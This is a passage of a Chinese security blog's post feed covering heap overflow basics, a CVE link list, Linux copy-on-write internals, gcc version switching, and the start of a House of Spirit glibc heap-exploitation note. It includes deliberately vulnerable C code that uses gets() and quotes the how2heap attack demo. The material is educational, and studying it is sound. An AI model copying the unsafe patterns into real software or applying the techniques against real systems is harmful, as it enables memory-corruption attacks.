从而改变程序固有执行流</li></ol></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流</li></ol><h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>举个简单的栗子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中 (实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756270: 0x0000000000000000      0x0000000000020d91 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>写入 ‘A’ * 100</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555756270: 0x4141414141414141      0x4141414141414141 &lt;=== top chunk</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>堆溢出中比较重要的几个步骤:</p><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *chunk, *chunk1;</span><br><span class="line">    chunk = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk1 = <span class="built_in">realloc</span>(chunk, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>realloc 会根据不同情况进行不同操作</p><ul><li>当 realloc(ptr, size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr), malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里</p><p>常见的危险函数如下:</p><ul><li>输入<ul><li>gets, 直接读取一行, 忽略<code>\x00</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy, 字符串复制, 遇到<code>\x00</code>停止</li><li>strcat, 字符串拼接, 遇到<code>\x00</code>停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据系统的位数，malloc会分配8或16字节的用户空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555756250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555756270</span><br><span class="line">Size: 0x20d91</span><br></pre></td></tr></table></figure><p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长</p><p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。回头再来看下之前的示例代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756270: 0x0000000000000000      0x0000000000020d91 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE Lists</title>
      <link href="/CVE-CVElists/"/>
      <url>/CVE-CVElists/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://lantern.cool/CVE-2016-5195">CVE-2016-5195</a></p><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><p><a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Copy-on-Write 机制</title>
      <link href="/note-binary-cow/"/>
      <url>/note-binary-cow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>如果有多个调用者同时请求相同的资源(如内存或磁盘上的数据存储)， 他们会共同获得相同的指针指向相同的资源，<strong>直到某个调用者试图修改资源的内容</strong>时，系统才会<strong>真正复制一份专用副本（private copy）</strong>给该调用者，而其他调用者所见到的<strong>最初的资源仍然保持不变</strong>。这过程对其他的调用者都是透明的（transparently）。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。</p><h2 id="fork-中的-COW"><a href="#fork-中的-COW" class="headerlink" title="fork 中的 COW"></a>fork 中的 COW</h2><p><a href="https://lantern.cool/note-binary-os-fork/">fork</a></p><p>fork 系统调用完成后，那么当父进程或者子进程尝试写共享物理页时，内核将拷贝物理页面</p><h3 id="写共享内存页"><a href="#写共享内存页" class="headerlink" title="写共享内存页"></a>写共享内存页</h3><p>当父进程 A 或子进程 B 任何一方对这些已共享的物理页面执行写操作时，都会产生页面出错异常（<code>page_fault int14</code>）中断，会将<code>flags &amp; FAULT_FLAG_WRITE</code>，然后通过<code>do_page_fault() -&gt; handle_mm_fault() -&gt; handle_pte_fault()</code>调用链解决这个异常。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">handle_pte_fault</span><span class="params">(struct vm_fault *vmf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (vmf-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">            <span class="keyword">return</span> do_wp_page(vmf);</span><br><span class="line">        entry = pte_mkdirty(entry);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pte_write</code> 会根据 <code>pte_flags(pte) &amp; _PAGE_RW</code> 判断页是否有写保护，这个标记是之前 fork 时 clear 掉的，所以会接着调用<code>do_wp_page</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This routine handles present pages, when users try to write</span></span><br><span class="line"><span class="comment"> * to a shared page. It is done by copying the page to a new address</span></span><br><span class="line"><span class="comment"> * and decrementing the shared-page counter for the old page.</span></span><br><span class="line"><span class="comment"> * 当用户试图写入共享页面时，此例程处理当前页面。将页面复制到一个新地址并减少旧页面的共享页面计数器。</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">do_wp_page</span><span class="params">(struct vm_fault *vmf)</span></span></span><br><span class="line"><span class="function">    __<span class="title">releases</span><span class="params">(vmf-&gt;ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> wp_page_copy(vmf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle the case of a page which we actually need to copy to a new page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called with mmap_sem locked and the old page referenced, but</span></span><br><span class="line"><span class="comment"> * without the ptl held.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * High level logic flow:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - Allocate a page, copy the content of the old page to the new one.</span></span><br><span class="line"><span class="comment"> * - Handle book keeping and accounting - cgroups, mmu-notifiers, etc.</span></span><br><span class="line"><span class="comment"> * - Take the PTL. If the pte changed, bail out and release the allocated page</span></span><br><span class="line"><span class="comment"> * - If the pte is still the way we remember it, update the page table and all</span></span><br><span class="line"><span class="comment"> *   relevant references. This includes dropping the reference the page-table</span></span><br><span class="line"><span class="comment"> *   held to the old page, as well as updating the rmap.</span></span><br><span class="line"><span class="comment"> * - In any case, unlock the PTL and drop the reference we took to the old page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">wp_page_copy</span><span class="params">(struct vm_fault *vmf)</span></span></span><br></pre></td></tr></table></figure><p>wp_page_copy 函数主要就是分配一个页面，将旧页面的内容复制到新页面。</p><p>至此，父进程子进程各自拥有一块内容相同的物理页面。最后，从异常处理函数中返回时，CPU 就会重新执行刚才导致异常的写入操作指令，使进程继续执行下去。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.leosocy.top/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Linux-COW%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9D%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">深入了解Linux-COW写时拷贝实现原理</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%AF%AB%E5%85%A5%E6%99%82%E8%A4%87%E8%A3%BD">维基百科 写入时复制</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux环境多版本编译器(gcc)共存</title>
      <link href="/tool-linux-muti-gcc/"/>
      <url>/tool-linux-muti-gcc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在linux开发环境下，有时候会遇到安装配置不同依赖包，而需要用到不同版本gcc或g++的情况并针对不同的编译需求进行版本的切换</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>环境: Ubuntu-18.04</li></ul><h3 id="下载安装欲新增版本的gcc工具"><a href="#下载安装欲新增版本的gcc工具" class="headerlink" title="下载安装欲新增版本的gcc工具"></a>下载安装欲新增版本的gcc工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc-4.8 g++-4.8</span><br></pre></td></tr></table></figure><h3 id="查看系统中已安装的gcc版本"><a href="#查看系统中已安装的gcc版本" class="headerlink" title="查看系统中已安装的gcc版本"></a>查看系统中已安装的gcc版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /usr/bin/gcc*</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  cve ls /usr/bin/gcc*</span><br><span class="line">/usr/bin/gcc      /usr/bin/gcc-ar      /usr/bin/gcc-nm      /usr/bin/gcc-ranlib</span><br><span class="line">/usr/bin/gcc-4.8  /usr/bin/gcc-ar-4.8  /usr/bin/gcc-nm-4.8  /usr/bin/gcc-ranlib-4.8</span><br><span class="line">/usr/bin/gcc-7    /usr/bin/gcc-ar-7    /usr/bin/gcc-nm-7    /usr/bin/gcc-ranlib-7</span><br></pre></td></tr></table></figure><h3 id="将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）"><a href="#将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）" class="headerlink" title="将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）"></a>将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 50</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50</span><br></pre></td></tr></table></figure><h3 id="选择要使用的gcc版本"><a href="#选择要使用的gcc版本" class="headerlink" title="选择要使用的gcc版本"></a>选择要使用的gcc版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config gcc</span><br></pre></td></tr></table></figure><p>执行效果如下:<br><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200817174235.png" alt="20200817174235"></p><ul><li>g++ 多版本共存与切换同理</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u011195662/article/details/81070837">Linux环境下多版本编译器(gcc)共存</a></p>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Spirit</title>
      <link href="/note-pwn-house-of-spirit/"/>
      <url>/note-pwn-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术, 算是一个组合型漏洞的利用</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为1, 因为 free 时, 如果是 mmap 的 chunk, 会单独处理</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li></ul><p>至于为什么要绕过这些检测，可以参考 free 部分的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read (__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*首先M标志位不能被置上才能绕过。release mmapped memory. */</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">                &amp;&amp; p-&gt;size</span><br><span class="line">                        &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_int_free 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">void</span></span><br><span class="line"> _int_free(mstate av, Void_t* mem)</span><br><span class="line"> &#123;</span><br><span class="line">   mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">   mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)   <span class="comment">/*其次，size的大小不能超过fastbin的最大值*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">       bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                         &gt;= av-&gt;system_mem, <span class="number">0</span>))                        <span class="comment">/*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*/</span></span><br><span class="line">      &#123;</span><br><span class="line">       errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">       <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p-&gt;fd = *fb;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里就直接以 how2heap 上的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c">house_of_spirit.c</a> 进行说明, 如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 